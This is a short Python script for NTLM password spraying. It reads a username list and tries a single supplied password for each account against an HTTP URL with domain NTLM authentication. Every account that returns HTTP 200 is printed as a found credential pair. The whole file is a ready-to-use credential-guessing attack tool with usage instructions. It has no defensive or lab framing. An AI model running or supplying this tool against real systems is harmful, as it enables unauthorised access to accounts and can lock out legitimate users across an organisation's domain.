import requests
import sys
from requests_ntlm import HttpNtlmAuth


if len(sys.argv) < 5:
    print("How to use:")
    print("req.py user_list URL FQDN PASSWORD")
    print("req.py usuarios http://localhost dominio.local password")
    sys.exit(1)


with open(sys.argv[1]) as files:
    arquivo = files.readlines()


password = sys.argv[4]
for X in arquivo:
    user = X.strip()
    response = requests.get(sys.argv[2], auth=HttpNtlmAuth(sys.argv[3] + "\\" + user, password))
    if response.status_code == 200:
        print(f"[ + ] FOUND: {user}  :   {sys.argv[4]}")
    else:
       pass
sys.exit()
